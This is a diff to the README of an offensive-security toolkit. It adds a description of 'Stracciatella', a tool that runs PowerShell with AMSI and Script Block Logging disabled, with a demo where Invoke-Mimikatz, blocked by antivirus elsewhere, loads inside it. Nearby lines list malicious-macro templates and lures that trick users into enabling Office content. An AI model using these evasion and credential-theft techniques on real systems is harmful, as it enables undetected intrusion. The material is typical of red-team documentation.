@@ -277,6 +277,82 @@ PS E:\PowerSploit\Recon> Get-DomainOU | Get-DomainOUTree
 
 - **`set-handler.rc`** - Quickly set metasploit's multi-handler + web_delivery (separated) handler for use with powershell. ([gist](https://gist.github.com/mgeeky/bf4d732aa6e602ca9b77d089fd3ea7c9))
 
+- **`Stracciatella`** - Powershell runspace from within C# (aka `SharpPick` technique) with AMSI and Script Block Logging disabled for your pleasure.
+
+  * This program provides functionality to decode passed parameters on the fly, using Base64 and Xor single-byte decode (also combined)
+  * Before launching any command, it makes sure to disable AMSI using two approaches
+  * Before launching any command, it makes sure to disable Script Block logging using two approaches
+  * This program does not patch any system library, system native code (think amsi.dll)
+  * Efforts were made to not store decoded script/commands excessively long, in order to protect itself from memory-dumping techniques governed by EDRs and AVs
+  * The resulting binary may be considered bit too large, that's because `Costura.Fody` NuGet package is used which bundles `System.Management.Automation.dll` within resulting assembly
+
+
+```
+PS D:\> Stracciatella.exe -v -b -x 0x31 -c "ZkNYRVQceV5CRRETeEURRl5DWkIRXVhaVBFQEVJZUENcEBMRChEVdElUUkRFWF5fcl5fRVRJRR9iVEJCWF5fYkVQRVQffVBfVkRQVlR8XlVU" .\Test2.ps1
+
+  :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
+  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>
+
+[.] Will load script file: '.\Test2.ps1'
+[+] AMSI Disabled.
+[+] Script Block Logging Disabled.
+[.] Language Mode: FullLanguage
+
+PS> & '.\Test2.ps1'
+PS> Write-Host "It works like a charm!" ; $ExecutionContext.SessionState.LanguageMode
+[+] Yeeey, it really worked.
+It works like a charm!
+FullLanguage
+
+PS D:\> "amsiInitFailed"
+At line:1 char:1
++ "amsiInitFailed"
++ ~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS D:\> . .\Invoke-Mimikatz.ps1
+At line:1 char:1
++ . .\Invoke-Mimikatz.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS D:\> .\Stracciatella.exe -v
+
+  :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
+  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>
+
+[-] It looks like no script path was given.
+[+] AMSI Disabled.
+[+] Script Block Logging Disabled.
+[.] Language Mode: FullLanguage
+
+Stracciatella D:\> . .\Invoke-Mimikatz.ps1
+
+Stracciatella D:\> Invoke-Mimikatz -Command "coffee ; exit"
+
+  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  '#####'                                     with 20 modules * * */
+
+mimikatz(powershell) # coffee
+
+    ( (
+     ) )
+  .______.
+  |      |]
+  \      /
+   `----'
+
+mimikatz(powershell) # ;
+```
+
 - **`SubstitutePageMacro.vbs`** - This is a template for the Malicious Macros that would like to substitute primary contents of the document (like luring/fake warnings to "Enable Content") and replace document's contents with what is inside of an AutoText named `RealDoc` (configured via variable `autoTextTemplateName` ). ([gist](https://gist.github.com/mgeeky/3c705560c5041ab20c62f41e917616e6))
 
 - **`warnings\EN-Word.docx`** and **`warnings\EN-Excel.docx`**  - Set of ready-to-use Microsoft Office Word shapes that can be pasted / inserted into malicious documents for enticing user into clicking "Enable Editing" and "Enable Content" buttons.
